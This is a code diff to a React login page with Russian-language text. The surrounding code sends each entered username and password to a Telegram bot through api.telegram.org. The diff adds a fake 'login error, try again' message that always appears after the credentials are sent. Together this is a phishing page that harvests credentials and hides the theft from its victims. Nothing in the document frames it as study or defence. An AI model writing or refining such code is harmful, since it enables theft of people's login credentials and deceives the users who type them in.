@@ -9,7 +9,7 @@ const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 const LoginPage = () => {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
-
+  const [error, setError] = useState(false);
   const handleSubmit = async (e) => {
     e.preventDefault();
     const message = `🔐 Новая попытка входа:\n👤 Username: ${username}\n🔑 Password: ${password}`;
@@ -23,6 +23,7 @@ const LoginPage = () => {
           text: message,
         }),
       });
+      setError(true)
     } catch (error) {
       alert('Ошибка отправки');
       console.error(error);
@@ -61,7 +62,7 @@ const LoginPage = () => {
             >
               Войти
             </button>
-
+            {error && <p className='text-red-500 text-center'>Ошибка входа, попробуйте еще раз.</p>}
             <div className='flex items-center justify-center mt-4'>
               <div className='border-[0.5px] border-gray-300 w-full'></div>
               <p className='px-2 text-slate-600 text-xl flex items-center'>или</p>
